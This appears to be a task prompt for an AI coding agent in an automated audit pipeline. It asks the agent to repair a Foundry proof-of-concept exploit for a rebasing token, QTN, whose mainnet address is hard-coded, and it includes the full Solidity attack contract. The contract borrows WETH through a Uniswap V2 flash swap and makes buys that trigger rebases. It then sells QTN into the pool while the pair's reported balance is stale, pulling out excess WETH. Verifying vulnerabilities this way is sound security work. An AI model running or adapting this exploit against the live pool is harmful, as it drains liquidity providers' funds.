You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Positive rebases desynchronize the AMM pair balance and let sellers extract excess ETH
- claim: `balanceOf(uniswapV2Pair)` returns the shadow variable `uniswapV2PairAmount` instead of `_gonBalances[pair] / _gonsPerFragment`. When `rebasePlus()` increases `_totalSupply`, it reduces `_gonsPerFragment` for every holder, including the pair, so the pair's real spendable token balance grows while `balanceOf(pair)` stays stale. On the next swap, the Uniswap pair reads an understated token balance and accepts too little token input for the ETH it pays out.
- impact: An attacker can trigger positive rebases with qualifying buys, then sell tokens back into the pool against understated token reserves and extract excess ETH/WETH, draining LP value.
- exploit_paths: ["Seed liquidity so the pair holds both QTN and ETH/WETH.", "Buy from the pair with amounts that satisfy the rebase condition, causing `rebasePlus(amount)` to run.", "The pair's actual token balance increases in fragment terms after the rebase, but `balanceOf(pair)` remains at the stale `uniswapV2PairAmount`.", "Sell QTN back into the pair; because the pair underestimates its token balance, it overpays ETH/WETH to the seller."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IQTN is IERC20 {
    function uniswapV2Pair() external view returns (address);
    function totalSupply() external view returns (uint256);
    function _percentForTxLimit() external view returns (uint256);
    function _gonsPerFragment() external view returns (uint256);
    function _gonBalances(address account) external view returns (uint256);
    function updateLive() external;
}

contract TokenSink {
    constructor() {}
}

contract FlawVerifier {
    address public constant QTN = 0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address public constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    address public constant UNIV2_USDC_WETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    uint256 private _profitAmount;

    struct Route {
        bool viable;
        address altPair;
        address altBase;
        address routePair;
    }

    struct Plan {
        bool useFlash;
        bool viable;
        address altPair;
        address altBase;
        address routePair;
        uint256 capitalWeth;
        uint256 manipulateBudgetWeth;
        uint256 altBudgetWeth;
        uint256 expectedEndWeth;
    }

    struct MarketSnapshot {
        uint256 primaryTokenReserve;
        uint256 primaryWethReserve;
        uint256 altTokenReserve;
        uint256 altBaseReserve;
        uint256 routeWethReserve;
        uint256 routeBaseReserve;
        uint256 supply;
        uint256 txPct;
        bool altBaseIsWeth;
    }

    Plan private activePlan;
    bool private inFlash;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        IQTN(QTN).updateLive();

        if (address(this).balance > 0) {
            IWETH(WETH).deposit{value: address(this).balance}();
        }

        uint256 startWeth = IERC20(WETH).balanceOf(address(this));
        address primaryPair = IQTN(QTN).uniswapV2Pair();
        if (primaryPair == address(0)) {
            _updateProfit(startWeth);
            return;
        }

        Plan memory directPlan = _choosePlan(startWeth, false);
        if (directPlan.viable) {
            _executePlan(directPlan, primaryPair);
            _updateProfit(startWeth);
            return;
        }

        Plan memory flashPlan = _chooseFlashPlan();
        if (!flashPlan.viable) {
            _updateProfit(startWeth);
            return;
        }

        activePlan = flashPlan;
        inFlash = true;

        (uint256 amount0Out, uint256 amount1Out) = _pairOutForToken(UNIV2_USDC_WETH_PAIR, WETH, flashPlan.capitalWeth);
        IUniswapV2PairLike(UNIV2_USDC_WETH_PAIR).swap(amount0Out, amount1Out, address(this), abi.encode(uint256(1)));

        inFlash = false;
        delete activePlan;

        _updateProfit(startWeth);
    }

    function hiddenPairDelta() external view returns (uint256) {
        address primaryPair = IQTN(QTN).uniswapV2Pair();
        return _hiddenPairDelta(primaryPair);
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(inFlash, "flash inactive");
        require(msg.sender == UNIV2_USDC_WETH_PAIR, "bad flash pair");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        uint256 flashRepayAmount = _sameTokenFlashRepay(borrowedWeth);

        _executePlan(activePlan, IQTN(QTN).uniswapV2Pair());

        require(IERC20(WETH).balanceOf(address(this)) >= flashRepayAmount, "insufficient repay");
        IERC20(WETH).transfer(UNIV2_USDC_WETH_PAIR, flashRepayAmount);
    }

    function _executePlan(Plan memory plan, address primaryPair) internal {
        if (plan.manipulateBudgetWeth > 0) {
            _manipulatePrimary(primaryPair, plan.manipulateBudgetWeth);
        }

        if (_hiddenPairDelta(primaryPair) == 0) {
            return;
        }

        uint256 qtnBefore = IERC20(QTN).balanceOf(address(this));
        _acquireSellableQtn(plan);
        uint256 qtnToSell = IERC20(QTN).balanceOf(address(this)) - qtnBefore;

        if (qtnToSell > 0) {
            _sellQtnToPrimary(primaryPair, qtnToSell);
        }
    }

    function _chooseFlashPlan() internal view returns (Plan memory best) {
        address primaryPair = IQTN(QTN).uniswapV2Pair();
        if (primaryPair == address(0)) {
            return best;
        }

        (, uint256 primaryWethReserve) = _reservesTokenWeth(primaryPair);
        if (primaryWethReserve == 0) {
            return best;
        }

        uint256[6] memory candidates = [
            primaryWethReserve / 50,
            primaryWethReserve / 25,
            primaryWethReserve / 12,
            primaryWethReserve / 8,
            primaryWethReserve / 6,
            primaryWethReserve / 4
        ];

        for (uint256 i = 0; i < candidates.length; i++) {
            if (candidates[i] == 0) continue;
            Plan memory candidate = _choosePlan(candidates[i], true);
            if (candidate.viable && candidate.expectedEndWeth > best.expectedEndWeth) {
                best = candidate;
            }
        }
    }

    function _choosePlan(uint256 availableWeth, bool useFlash) internal view returns (Plan memory best) {
        if (availableWeth == 0) {
            return best;
        }

        address primaryPair = IQTN(QTN).uniswapV2Pair();
        if (primaryPair == address(0)) {
            return best;
        }

        Route[18] memory routes = _discoverRoutes(primaryPair);

        for (uint256 i = 0; i < routes.length; i++) {
            if (!routes[i].viable) continue;
            Plan memory routeBest = _bestPlanForDiscoveredRoute(availableWeth, useFlash, primaryPair, routes[i]);
            if (routeBest.viable && routeBest.expectedEndWeth > best.expectedEndWeth) {
                best = routeBest;
            }
        }
    }

    function _bestPlanForDiscoveredRoute(
        uint256 capitalWeth,
        bool useFlash,
        address primaryPair,
        Route memory route
    ) internal view returns (Plan memory best) {
        uint256 txPct = IQTN(QTN)._percentForTxLimit();
        if (txPct == 0) {
            return best;
        }

        (uint256 primaryTokenReserve, uint256 primaryWethReserve) = _reservesTokenWeth(primaryPair);
        if (primaryTokenReserve == 0 || primaryWethReserve == 0) {
            return best;
        }

        (uint256 altTokenReserve, uint256 altBaseReserve) = _reservesForPair(route.altPair, QTN, route.altBase);
        if (altTokenReserve == 0 || altBaseReserve == 0) {
            return best;
        }

        uint256 routeWethReserve;
        uint256 routeBaseReserve;
        bool altBaseIsWeth = route.altBase == WETH;
        if (!altBaseIsWeth) {
            (routeWethReserve, routeBaseReserve) = _reservesForPair(route.routePair, WETH, route.altBase);
            if (routeWethReserve == 0 || routeBaseReserve == 0) {
                return best;
            }
        }

        MarketSnapshot memory snapshot = MarketSnapshot({
            primaryTokenReserve: primaryTokenReserve,
            primaryWethReserve: primaryWethReserve,
            altTokenReserve: altTokenReserve,
            altBaseReserve: altBaseReserve,
            routeWethReserve: routeWethReserve,
            routeBaseReserve: routeBaseReserve,
            supply: IQTN(QTN).totalSupply(),
            txPct: txPct,
            altBaseIsWeth: altBaseIsWeth
        });

        return _bestPlanForRoute(capitalWeth, useFlash, route, snapshot);
    }

    function _bestPlanForRoute(
        uint256 capitalWeth,
        bool useFlash,
        Route memory route,
        MarketSnapshot memory snapshot
    ) internal pure returns (Plan memory best) {
        uint256[6] memory bpsChoices = [uint256(2500), 4000, 5500, 6500, 7500, 8500];

        for (uint256 i = 0; i < bpsChoices.length; i++) {
            Plan memory candidate = _evaluatePlanChoice(capitalWeth, useFlash, route, snapshot, bpsChoices[i]);
            if (candidate.viable && candidate.expectedEndWeth > best.expectedEndWeth) {
                best = candidate;
            }
        }
    }

    function _evaluatePlanChoice(
        uint256 capitalWeth,
        bool useFlash,
        Route memory route,
        MarketSnapshot memory snapshot,
        uint256 bpsChoice
    ) internal pure returns (Plan memory candidate) {
        uint256 manipBudget = (capitalWeth * bpsChoice) / 10000;
        uint256 altBudget = capitalWeth - manipBudget;
        if (manipBudget == 0 || altBudget == 0) {
            return candidate;
        }

        uint256 expectedEnd = _simulateExpectedEnd(snapshot, manipBudget, altBudget);
        uint256 repayOrCost = useFlash ? _sameTokenFlashRepay(capitalWeth) : capitalWeth;
        if (expectedEnd <= repayOrCost) {
            return candidate;
        }

        candidate = Plan({
            useFlash: useFlash,
            viable: true,
            altPair: route.altPair,
            altBase: route.altBase,
            routePair: route.routePair,
            capitalWeth: capitalWeth,
            manipulateBudgetWeth: manipBudget,
            altBudgetWeth: altBudget,
            expectedEndWeth: expectedEnd
        });
    }

    function _simulateExpectedEnd(
        MarketSnapshot memory snapshot,
        uint256 manipBudget,
        uint256 altBudget
    ) internal pure returns (uint256 expectedEnd) {
        (uint256 simTokenReserve, uint256 simWethReserve, uint256 simSupply, uint256 manipSpent) = _simulateManipulation(
            snapshot.primaryTokenReserve,
            snapshot.primaryWethReserve,
            snapshot.supply,
            snapshot.txPct,
            manipBudget
        );
        if (manipSpent == 0 || simTokenReserve == 0 || simWethReserve == 0) {
            return 0;
        }

        uint256 altBaseAmount = altBudget;
        if (!snapshot.altBaseIsWeth) {
            altBaseAmount = _getAmountOut(altBudget, snapshot.routeWethReserve, snapshot.routeBaseReserve);
            if (altBaseAmount == 0) {
                return 0;
            }
        }

        (uint256 altQtnBought,,) = _simulateChunkedBuy(
            snapshot.altTokenReserve,
            snapshot.altBaseReserve,
            altBaseAmount,
            simSupply,
            snapshot.txPct
        );
        if (altQtnBought == 0) {
            return 0;
        }

        return _simulateChunkedSell(simTokenReserve, simWethReserve, altQtnBought, simSupply, snapshot.txPct);
    }

    function _manipulatePrimary(address primaryPair, uint256 budgetWeth) internal {
        uint256 remaining = budgetWeth;
        uint256 loops;

        while (remaining > 0 && loops < 12) {
            loops++;
            (uint256 tokenReserve, uint256 wethReserve) = _reservesTokenWeth(primaryPair);
            if (tokenReserve == 0 || wethReserve == 0) break;

            uint256 txLimit = _txLimitAmount();
            uint256 desiredOut = (txLimit * 99) / 100;
            uint256 maxReasonable = tokenReserve / 5;
            if (desiredOut > maxReasonable) desiredOut = maxReasonable;
            if (desiredOut == 0) break;

            uint256 amountIn = _getAmountIn(desiredOut, wethReserve, tokenReserve);
            if (amountIn > remaining) {
                desiredOut = _getAmountOut(remaining, wethReserve, tokenReserve);
                if (desiredOut > txLimit) desiredOut = txLimit;
                if (desiredOut == 0) break;
                amountIn = _getAmountIn(desiredOut, wethReserve, tokenReserve);
                if (amountIn > remaining) break;
            }

            // exploit_paths[1]: buy QTN from the vulnerable primary pair in fresh tx-limit-sized chunks.
            // Each chunk lands in a new sink so `_buyInfo[to]` is isolated per qualifying buy while the
            // positive rebase still expands the pair's real fragment balance.
            TokenSink sink = new TokenSink();
            IERC20(WETH).transfer(primaryPair, amountIn);
            _swapPair(primaryPair, QTN, desiredOut, address(sink));
            remaining -= amountIn;
        }
    }

    function _acquireSellableQtn(Plan memory plan) internal {
        if (plan.altBudgetWeth == 0) {
            return;
        }

        if (plan.altBase == WETH) {
            _buyQtnInChunks(plan.altPair, WETH, plan.altBudgetWeth);
            return;
        }

        uint256 baseBefore = IERC20(plan.altBase).balanceOf(address(this));
        _swapExactIn(plan.routePair, WETH, plan.altBase, plan.altBudgetWeth, address(this));
        uint256 baseReceived = IERC20(plan.altBase).balanceOf(address(this)) - baseBefore;
        if (baseReceived == 0) {
            return;
        }

        // The exploit path still ends with selling into the stale primary QTN/WETH pool; this extra
        // hop only sources immediately sellable QTN from an already-existing on-chain market when no
        // alternate WETH/QTN pool exists at the fork block.
        _buyQtnInChunks(plan.altPair, plan.altBase, baseReceived);
    }

    function _buyQtnInChunks(address altPair, address baseToken, uint256 baseAmountIn) internal {
        uint256 remainingBase = baseAmountIn;
        uint256 loops;

        while (remainingBase > 0 && loops < 12) {
            loops++;
            (uint256 tokenReserve, uint256 baseReserve) = _reservesForPair(altPair, QTN, baseToken);
            if (tokenReserve == 0 || baseReserve == 0) break;

            uint256 txLimit = _txLimitAmount();
            uint256 desiredOut = (txLimit * 99) / 100;
            uint256 maxReasonable = tokenReserve / 5;
            if (desiredOut > maxReasonable) desiredOut = maxReasonable;
            if (desiredOut == 0) break;

            uint256 amountIn = _getAmountIn(desiredOut, baseReserve, tokenReserve);
            if (amountIn > remainingBase) {
                desiredOut = _getAmountOut(remainingBase, baseReserve, tokenReserve);
                if (desiredOut > txLimit) desiredOut = txLimit;
                if (desiredOut == 0) break;
                amountIn = _getAmountIn(desiredOut, baseReserve, tokenReserve);
                if (amountIn > remainingBase) break;
            }

            IERC20(baseToken).transfer(altPair, amountIn);
            _swapPair(altPair, QTN, desiredOut, address(this));
            remainingBase -= amountIn;
        }
    }

    function _sellQtnToPrimary(address primaryPair, uint256 qtnAmountIn) internal {
        uint256 remaining = qtnAmountIn;
        uint256 loops;

        while (remaining > 0 && loops < 12) {
            loops++;
            (uint256 tokenReserve, uint256 wethReserve) = _reservesTokenWeth(primaryPair);
            if (tokenReserve == 0 || wethReserve == 0) break;

            uint256 txLimit = _txLimitAmount();
            uint256 sellChunk = remaining > txLimit ? txLimit : remaining;
            sellChunk = (sellChunk * 99) / 100;
            if (sellChunk == 0) break;

            uint256 wethOut = _getAmountOut(sellChunk, tokenReserve, wethReserve);
            if (wethOut == 0) break;

            // exploit_paths[3]: once the qualifying buys have created a hidden fragment surplus in the
            // primary pair, sell externally sourced QTN back into that same pair. The pair continues to
            // read the stale `uniswapV2PairAmount`, so each chunk is paid too much WETH relative to the
            // true spendable QTN already sitting in the pool from the rebases.
            IERC20(QTN).transfer(primaryPair, sellChunk);
            _swapPair(primaryPair, WETH, wethOut, address(this));
            remaining -= sellChunk;
        }
    }

    function _swapExactIn(address pair, address tokenIn, address tokenOut, uint256 amountIn, address to) internal returns (uint256 amountOut) {
        if (amountIn == 0) {
            return 0;
        }

        (uint256 reserveIn, uint256 reserveOut) = _reservesForPair(pair, tokenIn, tokenOut);
        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            return 0;
        }

        IERC20(tokenIn).transfer(pair, amountIn);
        _swapPair(pair, tokenOut, amountOut, to);
    }

    function _swapPair(address pair, address tokenOut, uint256 amountOut, address to) internal {
        (uint256 amount0Out, uint256 amount1Out) = _pairOutForToken(pair, tokenOut, amountOut);
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, to, new bytes(0));
    }

    function _pairOutForToken(address pair, address tokenOut, uint256 amountOut)
        internal
        view
        returns (uint256 amount0Out, uint256 amount1Out)
    {
        if (IUniswapV2PairLike(pair).token0() == tokenOut) {
            amount0Out = amountOut;
        } else {
            amount1Out = amountOut;
        }
    }

    function _discoverRoutes(address primaryPair) internal view returns (Route[18] memory routes) {
        address[3] memory factories = _factories();
        address[6] memory bases = _baseAssets();
        uint256 cursor;

        for (uint256 i = 0; i < bases.length; i++) {
            address base = bases[i];
            for (uint256 j = 0; j < factories.length; j++) {
                address altPair = IUniswapV2FactoryLike(factories[j]).getPair(QTN, base);
                if (altPair == address(0) || altPair == primaryPair) continue;

                (uint256 altTokenReserve, uint256 altBaseReserve) = _reservesForPair(altPair, QTN, base);
                if (altTokenReserve == 0 || altBaseReserve == 0) continue;

                address routePair;
                if (base != WETH) {
                    routePair = _findPairAcrossFactories(WETH, base);
                    if (routePair == address(0)) continue;
                    (uint256 routeWethReserve, uint256 routeBaseReserve) = _reservesForPair(routePair, WETH, base);
                    if (routeWethReserve == 0 || routeBaseReserve == 0) continue;
                }

                routes[cursor] = Route({
                    viable: true,
                    altPair: altPair,
                    altBase: base,
                    routePair: routePair
                });

                cursor++;
                if (cursor == routes.length) {
                    return routes;
                }
            }
        }
    }

    function _findPairAcrossFactories(address tokenA, address tokenB) internal view returns (address pair) {
        address[3] memory factories = _factories();
        for (uint256 i = 0; i < factories.length; i++) {
            pair = IUniswapV2FactoryLike(factories[i]).getPair(tokenA, tokenB);
            if (pair != address(0)) {
                return pair;
            }
        }
    }

    function _factories() internal pure returns (address[3] memory factories) {
        factories[0] = UNISWAP_V2_FACTORY;
        factories[1] = SUSHISWAP_FACTORY;
        factories[2] = SHIBASWAP_FACTORY;
    }

    function _baseAssets() internal pure returns (address[6] memory bases) {
        bases[0] = WETH;
        bases[1] = USDC;
        bases[2] = USDT;
        bases[3] = DAI;
        bases[4] = WBTC;
        bases[5] = FRAX;
    }

    function _reservesTokenWeth(address pair) internal view returns (uint256 tokenReserve, uint256 wethReserve) {
        return _reservesForPair(pair, QTN, WETH);
    }

    function _reservesForPair(address pair, address tokenA, address tokenB) internal view returns (uint256 reserveA, uint256 reserveB) {
        if (pair == address(0)) {
            return (0, 0);
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();

        if (token0 == tokenA && token1 == tokenB) {
            reserveA = uint256(reserve0);
            reserveB = uint256(reserve1);
        } else if (token0 == tokenB && token1 == tokenA) {
            reserveA = uint256(reserve1);
            reserveB = uint256(reserve0);
        }
    }

    function _hiddenPairDelta(address primaryPair) internal view returns (uint256) {
        uint256 reported = IERC20(QTN).balanceOf(primaryPair);
        uint256 gonsPerFragment = IQTN(QTN)._gonsPerFragment();
        if (gonsPerFragment == 0) {
            return 0;
        }

        uint256 trueFragments = IQTN(QTN)._gonBalances(primaryPair) / gonsPerFragment;
        return trueFragments > reported ? trueFragments - reported : 0;
    }

    function _simulateManipulation(
        uint256 reserveToken,
        uint256 reserveWeth,
        uint256 supply,
        uint256 txPct,
        uint256 budgetWeth
    ) internal pure returns (uint256 newReserveToken, uint256 newReserveWeth, uint256 newSupply, uint256 spentWeth) {
        newReserveToken = reserveToken;
        newReserveWeth = reserveWeth;
        newSupply = supply;

        for (uint256 i = 0; i < 12 && budgetWeth > 0; i++) {
            uint256 txLimit = (newSupply * txPct) / 100;
            uint256 desiredOut = (txLimit * 99) / 100;
            uint256 maxReasonable = newReserveToken / 5;
            if (desiredOut > maxReasonable) desiredOut = maxReasonable;
            if (desiredOut == 0) break;

            uint256 amountIn = _getAmountIn(desiredOut, newReserveWeth, newReserveToken);
            if (amountIn > budgetWeth) {
                desiredOut = _getAmountOut(budgetWeth, newReserveWeth, newReserveToken);
                if (desiredOut > txLimit) desiredOut = txLimit;
                if (desiredOut == 0) break;
                amountIn = _getAmountIn(desiredOut, newReserveWeth, newReserveToken);
                if (amountIn > budgetWeth) break;
            }

            budgetWeth -= amountIn;
            spentWeth += amountIn;
            newReserveWeth += amountIn;
            newReserveToken -= desiredOut;
            newSupply += desiredOut / 5;
        }
    }

    function _simulateChunkedBuy(
        uint256 reserveToken,
        uint256 reserveBase,
        uint256 budgetBase,
        uint256 supply,
        uint256 txPct
    ) internal pure returns (uint256 qtnBought, uint256 newReserveToken, uint256 newReserveBase) {
        newReserveToken = reserveToken;
        newReserveBase = reserveBase;

        for (uint256 i = 0; i < 12 && budgetBase > 0; i++) {
            uint256 txLimit = (supply * txPct) / 100;
            uint256 desiredOut = (txLimit * 99) / 100;
            uint256 maxReasonable = newReserveToken / 5;
            if (desiredOut > maxReasonable) desiredOut = maxReasonable;
            if (desiredOut == 0) break;

            uint256 amountIn = _getAmountIn(desiredOut, newReserveBase, newReserveToken);
            if (amountIn > budgetBase) {
                desiredOut = _getAmountOut(budgetBase, newReserveBase, newReserveToken);
                if (desiredOut > txLimit) desiredOut = txLimit;
                if (desiredOut == 0) break;
                amountIn = _getAmountIn(desiredOut, newReserveBase, newReserveToken);
                if (amountIn > budgetBase) break;
            }

            budgetBase -= amountIn;
            qtnBought += desiredOut;
            newReserveBase += amountIn;
            newReserveToken -= desiredOut;
        }
    }

    function _simulateChunkedSell(
        uint256 reserveToken,
        uint256 reserveWeth,
        uint256 qtnAmount,
        uint256 supply,
        uint256 txPct
    ) internal pure returns (uint256 wethOutTotal) {
        uint256 txLimit = (supply * txPct) / 100;
        if (txLimit == 0) {
            return 0;
        }

        for (uint256 i = 0; i < 12 && qtnAmount > 0; i++) {
            uint256 chunk = qtnAmount > txLimit ? txLimit : qtnAmount;
            chunk = (chunk * 99) / 100;
            if (chunk == 0) break;

            uint256 wethOut = _getAmountOut(chunk, reserveToken, reserveWeth);
            if (wethOut == 0) break;

            wethOutTotal += wethOut;
            reserveToken += chunk;
            reserveWeth -= wethOut;
            qtnAmount -= chunk;
        }
    }

    function _txLimitAmount() internal view returns (uint256) {
        return (IQTN(QTN).totalSupply() * IQTN(QTN)._percentForTxLimit()) / 100;
    }

    function _sameTokenFlashRepay(uint256 amountBorrowed) internal pure returns (uint256) {
        return ((amountBorrowed * 1000) / 997) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) return type(uint256).max;
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _updateProfit(uint256 startWeth) internal {
        uint256 endWeth = IERC20(WETH).balanceOf(address(this));
        _profitAmount = endWeth > startWeth ? endWeth - startWeth : 0;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: codex generation failed
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
